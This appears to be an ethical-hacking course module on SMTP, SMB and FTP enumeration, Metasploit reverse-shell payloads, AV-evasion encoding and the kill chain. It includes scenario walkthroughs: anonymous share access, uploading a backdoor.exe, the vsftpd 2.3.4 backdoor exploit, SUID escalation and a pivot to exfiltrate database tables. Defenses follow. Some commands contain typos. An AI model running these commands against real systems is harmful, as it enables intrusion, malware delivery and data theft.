SMTP Enumeration Techniques

Discovering and validating users on SMTP servers

What is SMTP?

Simple Mail Transfer Protocol (SMTP) is responsible for sending and receiving emails. Organizations deploy SMTP servers with specific domain names to handle email communication.

  • Function: Sends emails and manages mail routing
  • Protocol Type: Text-based TCP/IP protocol
  • Standard Port: 25 (SMTP), 465 (SMTPS - Secure), 587 (Submission)
  • Vulnerability Risk: User enumeration if not properly configured

SMTP Enumeration Value

Attackers enumerate SMTP servers to:

  • Identify valid usernames in the organization
  • Discover organizational structure and email conventions
  • Find vulnerabilities in email server configuration
  • Perform targeted phishing attacks with real usernames
  • Establish baseline for social engineering
⚠️ Security Risk: An improperly configured SMTP server can reveal valid usernames, enabling targeted attacks and unauthorized access.

Ethical Hacker Approach

As an ethical hacker, you must think like an attacker to find these vulnerabilities:

  • Validate organizational security posture
  • Document all SMTP misconfigurations
  • Create comprehensive POC reports
  • Recommend remediation strategies
  • Verify fixes in follow-up assessments

SMTP Commands for User Enumeration

Understanding VRFY, EXPN, and RCPT commands

SMTP Enumeration Commands

Command Full Name Purpose Security Risk
VRFY Verify Validates if a user exists (returns different responses for valid/invalid users) Direct user enumeration
EXPN Expand Shows the actual delivery address of alias and mailing lists Reveals group memberships and aliases
RCPT TO: Recipient Defines the recipient's message destination Can validate valid email addresses

Server Response Patterns

SMTP servers respond differently based on whether a user exists:

  • Valid User: "250 User found" or similar positive response
  • Invalid User: "550 User not found" or similar rejection
  • Different Response Times: Valid users may cause different processing delays
  • Error Messages: Different error codes for valid vs invalid users

SMTP User Enumeration Tool Usage

smtp-user-enum -M VRFY -U username.txt -t target_ip
# -M: Specify method (VRFY, EXPN, RCPT)
# -U: Username file to test
# -t: Target SMTP server IP address

# Results show:
# Username: exists
# Adminuser: exists
# Root: exists
# Other: not found

User Enumeration Workflow

  1. Identify SMTP server IP and port (typically port 25)
  2. Prepare wordlist of common usernames
  3. Use smtp-user-enum with VRFY method
  4. Document all valid usernames found
  5. Cross-reference with other reconnaissance data
  6. Prepare report with valid user list
✓ Mitigation: Disable VRFY and EXPN commands, implement rate limiting, use SMTP authentication requirements.

Process Monitoring with TOP Command

Understanding system resource consumption and running processes

The TOP Command

The top command is a real-time system monitoring tool similar to Windows Task Manager:

  • Displays running processes and their resource consumption
  • Shows CPU utilization percentage
  • Shows memory usage (RAM and swap)
  • Reveals which users own running processes
  • Allows killing processes if needed
  • Helps identify resource-hungry applications

- Total tasks: 155 processes (1 running, 154 sleeping)
- CPU utilization: 9%
- Memory usage:
  * Total: ~2GB
  * Free: 438MB
  * Used: 966MB
- Swap memory: Available for overflow when RAM full

SMB and NetBIOS Protocol Overview

Understanding network file sharing and its security implications

What is SMB?

Server Message Block (SMB) is a network protocol for accessing files, printers, and other devices on a network.

  • Purpose: Network file sharing, printer sharing, and device access
  • Primary Platform: Windows (dominant), also Linux via Samba
  • Standard Ports: 139 (NetBIOS over SMB), 445 (Direct SMB)
  • Protocol Type: Client-Server architecture
  • Capabilities: File access, printer access, pipe communications

NetBIOS and SMB Relationship

NetBIOS is a legacy naming protocol that bridges with SMB:

  • NetBIOS Session Service (Port 139): Legacy SMB over NetBIOS
  • Direct SMB (Port 445): Modern SMB over TCP/IP (Windows 2000+)
  • Discovery: NetBIOS enables browsing and device discovery on local networks
  • Scope: NetBIOS limited to local networks (not internet-routable)
🔴 CRITICAL RISK: Port 139 open on internet-facing systems is EXTREMELY DANGEROUS. This port enables direct share enumeration and unauthorized file access. Organizations must block port 139 from external access.

SMB/NetBIOS Port Information

Port Protocol Service Risk Level
137 UDP NetBIOS Name Service High
138 UDP NetBIOS Datagram Service High
139 TCP NetBIOS Session Service CRITICAL
445 TCP Direct SMB (Modern) CRITICAL

Organizational Use Cases

Why organizations use SMB/NetBIOS:

  • Shared Drives: Central file storage accessible by multiple users
  • Shared Printers: Network-connected printers accessible by all users
  • User-based Access Control: Different users access different shares
  • Department-specific Resources: HR files only accessible to HR staff
  • Application Sharing: Central location for shared applications
⚠️ Why It's Dangerous: If port 139/445 are open, attackers can enumerate shares and gather organizational structure, user information, and potentially access sensitive data without authentication.

SMB Enumeration and Exploitation

Discovering shares and gathering intelligence from SMB servers

SMB Scanning with NMAP

nmap -pn --script smb-enum-shares -p139,445 target_ip
# -pn: No ping (assume host is up)
# --script: Use SMB enumeration scripts
# -p139,445: Specific ports to scan

# Alternative syntax:
nmap -pn -sS -p139,445 -sV target_ip
# -sS: TCP SYN scan
# -sV: Service version detection

SMB Information Gathering

Key information obtained through SMB enumeration:

  • Available Shares: List of all shared directories and their permissions
  • NetBIOS Computer Name: System hostname on the network
  • Workgroup/Domain: Network group membership
  • Security Settings: SMB signing, encryption status
  • OS Version: Windows version and build number
  • Share Permissions: Who can access which shares

SMB Share Discovery Tools

# NBTstat - NetBIOS name lookup (Windows/Linux)
nbtstat -A target_ip
# Shows NetBIOS names, services, and group information

# nmblookup - NetBIOS lookup (Kali/Linux)
nmblookup -A target_ip
# Output: NetBIOS name, type, service information

# smbmap - Map SMB shares
smbmaps -H target_ip
# Shows: Directory shares, permissions, access levels
# Identifies readable and writable shares

# SMB Client - Connect to shares
smbclient //target_ip/sharename
# Connect to specific share
# 'ls' to list files
# 'get' to download files
# 'put' to upload files

SMB Share Types and Access Levels

Share Type Typical Use Access Level Security Risk
ADMIN$ Administrative share Admin only Critical if accessible
C$ D$ E$ Drive shares Admin only Full system access
IPC$ Interprocess communication Limited Allows null session enumeration
User Shares User-created shares Varies May contain sensitive data

Accessing SMB Shares

# Anonymous connection attempt
smbclient //target_ip/TMT
# If successfully connected, you can list files:
ls
# See directories and file listings

# Download files
mget *
# Downloads all accessible files

# Upload files (if writable)
mput malicious.exe
# Upload payload to target system

# This is how attackers deliver malware!

SMB Exploitation Workflow

  1. Scan ports 139 and 445 with NMAP
  2. Use nbstat or nmblookup to get system information
  3. List available shares with smbmap or smbclient
  4. Identify readable and writable shares
  5. Connect to accessible shares
  6. Document sensitive data found
  7. Attempt to upload malicious files if writable
  8. Create POC report with findings
🚨 Attack Vector: If attackers can upload files to writable shares, they can introduce malware that executes when accessed by legitimate users or administrators.

FTP Service and Organizational Use

Understanding FTP deployment for centralized file management

What is FTP?

File Transfer Protocol (FTP) enables file transfer between client and server over TCP/IP networks.

  • Purpose: Centralized file sharing and access control across network
  • Standard Port: 21 (Control), 20 (Data - Active mode)
  • Authentication: Username and password required
  • Architecture: Client-Server model with remote access
  • Scope: Can reach across internet with proper configuration

Why Organizations Deploy FTP

FTP provides critical organizational functions:

  • Centralized Storage: All organizational files stored in one location
  • Remote Access: Employees can access files from anywhere
  • User-based Access Control: Different users → different permissions
  • Department Isolation: HR files only for HR, not for other departments
  • Public Internet Access: May share specific data with external partners
  • Automatic Backup: Centralized backup and disaster recovery

Multi-User Department Structure Example

FTP Server Directory Structure:
/home/
  ├── /HR/           (accessible only to HR staff)
  ├── /Accounting/   (accessible only to accounting staff)
  ├── /IT/           (accessible only to IT staff)
  ├── /Marketing/    (accessible only to marketing staff)
  └── /Public/       (accessible to all employees)

Authentication:
- mike (HR Department) → Can only access /HR/
- sam (Accounting)     → Can only access /Accounting/
- john (IT)            → Can only access /IT/
- Admin                → Can access all directories

This ensures data privacy and organizational security.
⚠️ CRITICAL VULNERABILITY: If an FTP server is compromised, the ENTIRE organizational database is at risk. All departments' confidential data becomes accessible to the attacker.

FTP Security Implications

  • Plaintext Credentials: FTP transmits username/password in clear text (use SFTP instead)
  • Default Configurations: Many FTP servers installed with weak defaults
  • Known Vulnerabilities: Older FTP implementations have documented exploits
  • Backdoor Potential: Compromised FTP allows persistent access via uploaded files
  • Data Exfiltration: Access to all company data in one location

Payloads and Encoding Techniques

Creating and encoding malicious code for delivery

Understanding Payloads

Payloads are the malicious code that executes on the target system after successful exploitation.

  • Function: Establish connection back to attacker's machine (C2 connection)
  • Meterpreter: Advanced payload with many post-exploitation features
  • Reverse Shell: Target connects back to attacker's listening port
  • Bind Shell: Attacker connects directly to listening port on target
  • Staged vs Unstaged: Staged is smaller but slower; unstaged is complete

Common Payload Types

# Windows Payloads:
windows/meterpreter/reverse_tcp
# Full-featured reverse shell with post-exploitation capabilities

windows/shell_reverse_tcp
# Simple reverse shell with basic command execution

# Linux Payloads:
linux/x86/meterpreter/reverse_tcp
# Meterpreter for Linux x86 architecture

linux/x86/shell_bind_tcp
# Shell bound to listening port on target

# Bind vs Reverse Connection:
# REVERSE: Target initiates connection to attacker's machine
#          Attacker: nc -lvp 4444 (listening port)
#          More reliable through firewalls

# BIND: Attacker initiates connection to target
#       Target must have open port listening
#       Firewall may block this connection

Reverse TCP vs Bind TCP

Understanding the key difference:

  • Reverse TCP (Preferred):
    • Target machine initiates connection to attacker
    • Attacker only needs to know target IP
    • Works through most firewalls (outbound connections often allowed)
    • If target network changes, connection drops but reconnect attempts work
  • Bind TCP (Less Preferred):
    • Attacker must know target IP AND port
    • Attacker connects directly to target's listening port
    • Firewall may block incoming connections
    • If network infrastructure changes, must rescan and update IP

Payload Encoding Techniques

Encoders modify payloads to evade detection systems:

  • Purpose: Bypass antivirus, IDS/IPS, and content filters
  • Shikata Ga Nai: Polymorphic XOR encoder (most effective)
  • fnstenv_mov: Uses floating-point instruction set
  • jmp_call_additive: Uses jump/call instructions for obfuscation
  • Multiple Encoding: Encode multiple times for better evasion

Setting Up Reverse Connection

# Attacker Setup:
1. Start listener on attacker machine (Kali):
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.100    # Attacker IP
   set LPORT 4444             # Attacker listening port
   exploit

2. Listener waits for connection from target

# Generate malicious file:
   set LHOST 192.168.1.100
   set LPORT 4444
   generate -f exe -o payload.exe

# Target executes payload.exe
# Automatic reverse connection to attacker!

# Attacker receives shell session
# Can run commands on target system
🔴 POC Payload: Staged payloads (meterpreter) deliver functional access without triggering AV. This is why encoding is critical for penetration testing success.

Wayback Machine and Deleted Content Discovery

Finding historical versions of websites and deleted URLs

What is Wayback Machine?

The Internet Archive's Wayback Machine is a public database of historical website snapshots.

  • Purpose: Archives website versions from years past
  • Access: Publicly available at archive.org
  • Coverage: Billions of web pages captured since 1996
  • Value: Discover deleted URLs, find sensitive endpoints, identify technology stack changes
  • Timing: Multiple snapshots of websites at different dates

Reconnaissance Application

Attackers and penetration testers use Wayback Machine to:

  • Find Deleted Admin Pages: Deleted URLs may still work if not properly removed
  • Identify Infrastructure Changes: Track server migrations and technology updates
  • Discover Old Vulnerabilities: Technologies used in past may have known exploits
  • Find Email Addresses: Old website versions may list employee emails
  • Identify Organizational Structure: Past team listings and department changes
  • Map API Endpoints: Legacy APIs that may still be functional

Remote Code Execution and Post-Exploitation

Executing commands on compromised systems

What is Remote Code Execution?

Remote Code Execution (RCE) means executing arbitrary commands on a target system remotely.

  • Achievement: After successful exploitation, attacker gains shell access
  • Capability: Run any command as the compromised user
  • Privilege Level: Commands execute with privileges of service owner
  • Impact: Total system compromise if running as root/system

Advanced post-exploitation with Metasploit Meterpreter:

  • File Transfer: Download/upload files from target

  • Privilege Escalation: Attempt to gain root/admin privileges
  • System Information: Gather detailed system configuration
  • Screen Capture: Screenshot target desktop

Understanding the complete lifecycle of attacks and vulnerability chains

Stage 1: Reconnaissance (No Interaction)

Goal: Gather intelligence about target without triggering alarms

  • Passive Reconnaissance: Use public sources (WHOIS, DNS, social media)
  • Active Reconnaissance: Direct probing (pings, port scans, vulnerability scans)
  • Information Gathered: IP addresses, domain names, email addresses, organizational structure
  • Tools Used: OSINT tools, Shodan, Google dorks, social media analysis

Stage 2: Weaponization (Offline)

Goal: Create malicious payload or exploit code

  • Exploit Development: Code that takes advantage of specific vulnerability
  • Payload Encoding: Modify payload to evade detection
  • Delivery Mechanism: How will payload reach target (email, drive-by download, etc.)
  • Tools Used: Metasploit, custom exploit code, encryption tools
  • Zero-Day Creation: Developing exploits for unknown vulnerabilities

Stage 3: Delivery (Targeted)

Goal: Get weaponized payload to target system

  • Email Phishing: Malicious attachment or link in email
  • USB Drop: Physical malware delivery via USB stick
  • Drive-by Download: Exploitation via compromised website
  • Network-based: Exploit network service directly without user interaction
  • Success Metrics: Did payload reach target? Was it executed?

Stage 4: Exploitation (Vulnerability Triggered)

Goal: Execute payload and establish foothold on system

  • Privilege Level: Payload executes with privileges of vulnerable service
  • Initial Access: Attacker gains shell access or remote connection
  • Exploit Timeline: From delivery to code execution (seconds to minutes)
  • Success Verification: Confirm code execution before moving to next stage
  • Example from Module 5: VSFTPD 2.3.4 backdoor exploitation

Stage 5: Installation (Persistence)

Goal: Maintain access even after system reboot

  • Backdoor Creation: Create persistent entry point
  • Rootkit Installation: Hide malware and attacker activities
  • Service Hijacking: Leverage legitimate services for persistence
  • Scheduled Tasks: Create recurring malicious jobs
  • Stealth Techniques: Avoid detection by security software

Stage 6: Command & Control (C&C Communication)

Goal: Establish communication channel with compromised system

  • Reverse Connection: Compromised system calls back to attacker
  • Bind Connection: Attacker connects directly to listening port on target
  • Covert Channels: Hide C&C traffic within legitimate protocols
  • Encryption: Encrypt communications to avoid detection
  • Botnet Operation: Control many infected systems simultaneously

Stage 7: Actions on Objectives (Damage Phase)

Goal: Achieve attacker's ultimate objective

  • Data Exfiltration: Steal sensitive data and intellectual property
  • Lateral Movement: Pivot to other systems on the network
  • Privilege Escalation: Escalate from user to administrator privileges
  • Sabotage: Destroy data or systems (ransomware, wiper malware)
  • Espionage: Long-term surveillance and data collection

Vulnerability Chain: Combining Multiple Weaknesses

Sophisticated attacks often chain multiple vulnerabilities together:

  • Single Point of Failure: One vulnerability ≠ complete compromise
  • Privilege Escalation Chain: User → Admin → System
  • Lateral Movement Chain: Compromised system A → Access system B → Access system C
  • Application Chain: Bypass firewall → Exploit application → Extract database
  • Real-World Example: Phishing (delivery) → Click attachment (exploitation) → Install malware (installation) → Steal credentials (objective)
✓ Key Insight: Defenders can break the chain at ANY stage. Investing in detection and response at each stage significantly increases attacker difficulty.

Scenario 1: SMTP User Enumeration Attack

Initial Conditions:

  • Target Organization: TechCorp Inc. (techcorp.com)
  • SMTP Server: mail.techcorp.com (192.168.1.50:25)
  • Vulnerability: VRFY command enabled, no rate limiting

Attack Sequence:

Step 1: Reconnaissance ▼
nmap -p 25 -sV mail.techcorp.com # Result: SMTP service detected on port 25

Result: SMTP server identified and responding

Step 2: Connect to SMTP ▼
telnet mail.techcorp.com 25 # Response: 220 mail.techcorp.com ESMTP ready

Result: Successfully connected to SMTP server

Step 3: Enumerate Valid Users ▼
VRFY admin # Response: 250 admin@techcorp.com (VALID) VRFY root # Response: 250 root@techcorp.com (VALID) VRFY testuser # Response: 550 Not found (INVALID)

Result: Identified valid users: admin, root

Step 4: Objective Achieved ▼

Attacker Action: Use discovered emails for phishing campaign targeting admin@techcorp.com

Impact: Phishing email appears legitimate, higher success rate

Learning Outcome:

  • Understand how SMTP protocol can be abused for user enumeration
  • Recognize vulnerable SMTP configurations
  • See how one vulnerability enables further attacks

Scenario 2: SMB Share Exploitation

Initial Conditions:

  • Target: File server (FileServer01, 192.168.1.100)
  • Ports 139 & 445 accessible (exposed to attacker)
  • Vulnerability: Unauthenticated share access, misconfigured permissions

Attack Sequence:

Step 1: Service Discovery ▼
nmap -p 139,445 --script smb-enum-shares 192.168.1.100 # Discovers SMB service version and shares available

Result: SMB shares identified

Step 2: List Available Shares ▼
smbclient -L //192.168.1.100/ -N # Lists shares without authentication # Found: Shared$/TMT/Backups/Users

Result: Multiple shares enumerated

Step 3: Connect to Writable Share ▼
smbclient //192.168.1.100/TMT -N # Anonymous login successful # smb: \> ls # Lists contents of TMT directory

Result: Share is readable and writable

Step 4: Upload Malicious Payload ▼
mput backdoor.exe # Uploads payload to target share # File sits in shared location, accessible to other users

Result: Malware delivered to network

Step 5: Objective Achieved ▼

Attacker Action: Wait for administrator or user to access TMT share and execute backdoor.exe

Impact: When executed, backdoor establishes reverse connection to attacker C&C server

Learning Outcome:

  • Understand SMB enumeration and exploitation workflow
  • Recognize dangers of open network shares
  • See how misconfigurations lead to compromise

Scenario 3: FTP Server Compromise and Pivot

Initial Conditions:

  • Target: FTP Server running VSFTPD 2.3.4 (192.168.1.80:21)
  • Vulnerability: Known backdoor in this version (CVE-2011-2523)
  • Internal network access to database and application servers

Attack Sequence:

Step 1: Initial Exploitation ▼
use exploit/unix/ftp/vsftpd_234_backdoor set RHOST 192.168.1.80 exploit # Result: Meterpreter shell gained

Result: Remote code execution achieved on FTP server

Step 2: System Information Gathering ▼
uname -a # Linux ftp-server 5.4.0 #1 SMP x86_64 GNU/Linux ifconfig # eth0 192.168.1.80 (external) # eth1 10.0.0.5 (internal network)

Result: Discovered FTP server has access to internal network

Step 3: Lateral Movement Reconnaissance ▼
arp -a # 10.0.0.1 (gateway) # 10.0.0.10 (database server - ACTIVE) # 10.0.0.20 (application server - ACTIVE) nmap -sn 10.0.0.0/24 # Maps internal network topology

Result: Identified target systems for lateral movement

Step 4: Privilege Escalation ▼
find / -perm -4000 2>/dev/null # Identifies SUID binaries # Exploit SUID binary for root access ./suid_binary -c "id" # uid=0(root) gid=0(root) groups=0(root)

Result: Escalated from vsftpd user to root

Step 5: Pivot to Database Server ▼
# From FTP server (now with root access): ssh -l root 10.0.0.10 # Successfully logs into database server select * from employees; select * from financial_data; # Exfiltrates sensitive data

Result: Complete compromise of internal network

Learning Outcome:

  • Understand complete attack chain from initial access to data theft
  • See how one compromised system becomes pivot point
  • Recognize importance of network segmentation and defense-in-depth

Key Lessons from Simulation Scenarios

  • Chaining Vulnerabilities: Individual vulnerabilities become critical when combined
  • Information Cascade: Each compromise reveals more information for next attack
  • Least Privilege Principle: Even if one system compromised, damage limited by proper permission configuration
  • Network Isolation: Attackers often need to pivot; proper segmentation reduces this
  • Time Factor: More systems accessed = longer timeline = greater chance of detection

Defense Mechanisms and Mitigation Strategies

Protecting systems against exploitation techniques covered in this module

Layer 1: Prevention (Stop Attacks Before They Happen)

🛡️ Disable Vulnerable Protocols

  • SMTP User Enumeration: Disable VRFY and EXPN commands in SMTP configuration
  • Plain-text FTP: Replace with SFTP (SSH File Transfer Protocol)
  • NetBIOS: Disable NetBIOS over port 139 if only internal network needs SMB
  • Legacy Services: Remove unneeded services entirely
# SMTP Configuration (disable VRFY/EXPN): disable_vrfy_command = YES disable_expn_command = YES

🔐 Implement Authentication & Authorization

  • FTP Authentication: Require strong credentials, disable anonymous access
  • SMB Share Permissions: Restrict share access by user/group
  • SMTP Relay Restriction: Only allow authenticated users to send mail
  • Principle of Least Privilege: Users only access what they need
# SMB Share Permissions: # Only HR department users access /HR/ share # Only Finance department users access /Finance/ share # Remove "Everyone" full access permissions

📋 Configuration Hardening

  • Disable Unnecessary Services: If FTP not needed, remove from servers
  • Change Default Settings: Don't use default credentials or configurations
  • Rate Limiting: Limit SMTP/FTP connection attempts
  • Banner Modifications: Don't reveal service version in banners
# Disable service version revealing: Banner: "220 SMTP Server Ready" # Better # Instead of: Banner: "220 vsftpd 2.3.4" # Reveals version

🔄 Keep Systems Updated

  • Security Patches: Apply immediately when available
  • Vulnerability Scanning: Regular scanning identifies vulnerable versions
  • End-of-Life Software: Don't use obsolete software no longer receiving patches
  • Example: VSFTPD 2.3.4 had vulnerability for 5+ years before awareness increased

Layer 2: Detection (Identify Attacks in Progress)

👁️ Logging and Monitoring

  • SMTP Logs: Log all VRFY/EXPN attempts, failed connections
  • FTP Logs: Log all connection attempts, file transfers, failed logins
  • SMB Audit: Log share accesses, permission changes, failed access attempts
  • Centralized Logging: Send all logs to central SIEM for correlation
Alert: VRFY admin received 50 requests in 2 minutes Alert: Anonymous FTP login to TMT share Alert: 1000+ failed SMB connection attempts from 192.168.1.1 Alert: Non-standard file upload to system share

🚨 Intrusion Detection Systems (IDS)

  • Network IDS: Detect exploitation traffic patterns
  • Host-based IDS: Detect suspicious process execution
  • Anomaly Detection: Alert on unusual SMTP/FTP/SMB usage
  • Signature Detection: Recognize known Metasploit exploitation patterns

📊 Security Information Event Management (SIEM)

  • Correlate Events: Connect SMTP enumeration + later phishing click
  • Timeline Analysis: See complete attack sequence
  • Incident Detection: Alert security team automatically
  • Post-Incident Analysis: Analyze logs after compromise discovered

Layer 3: Response (Contain and Recover)

🚨 Incident Response Plan

  • Detection Procedure: Know how to identify active compromise
  • Isolation Procedure: How to disconnect compromised system
  • Evidence Preservation: Capture logs and memory before shutting down
  • Communication Protocol: Who to notify, escalation procedures
  • Recovery Procedure: How to restore system from backups

🔒 Backup and Recovery

  • Regular Backups: Daily or more frequent for critical data
  • Offline Backups: Some backups disconnected from network (ransomware protection)
  • Recovery Testing: Regularly test restore procedures
  • Versioning: Keep multiple versions of backed-up data

🔐 Forensic Analysis

  • Access Logs: Who accessed what data and when?
  • Process Analysis: What processes ran on compromised system?
  • Network Traffic: What data was exfiltrated?
  • Timeline Reconstruction: How long was system compromised?

Exploitation vs Defense Timeline

Time Attacker Activity Defense Opportunity
T+0 min Reconnaissance - SMTP enumeration DETECTION: Alert on VRFY spam
T+5 min Weaponization - Create phishing email PREVENTION: Email filter blocks malicious attachment
T+10 min Delivery - Send phishing email DETECTION: Email gateway logs suspicious email
T+15 min Exploitation - User clicks link PREVENTION: Endpoint protection blocks exploit
T+20 min Installation - Malware installed DETECTION: Behavioral analysis detects malware
T+25 min C&C - Phone home for commands DETECTION: Network IDS blocks C&C connection
T+30 min Actions - Steal data, plant backdoor RESPONSE: Isolate system, investigate
✓ Defense in Depth: No single defense is perfect. Multiple layers mean even if one fails, others can catch the attack.

Knowledge Check

Q1: What command validates if a user exists on SMTP server?

Answer: VRFY (Verify) command - sends different responses for valid/invalid users

Q2: Why is reverse TCP payload preferred over bind TCP?

Answer: Target initiates connection so attacker only needs target IP. If network changes, attacker doesn't need rescanning. Works through most firewalls.

Q3: Which port is MOST critical if exposed externally?

Answer: Port 139 (NetBIOS over SMB) - enables direct share enumeration and unauthenticated data access

Q4: What is the purpose of payload encoding in Metasploit?

Answer: Evade detection by antivirus, IDS/IPS, and content filters. Shikata Ga Nai is a popular polymorphic encoder.

Q5: What happens at Stage 6 (Command & Control) in the Kill Chain?

Answer: Compromised system establishes communication with attacker's C&C server for command reception and data exfiltration
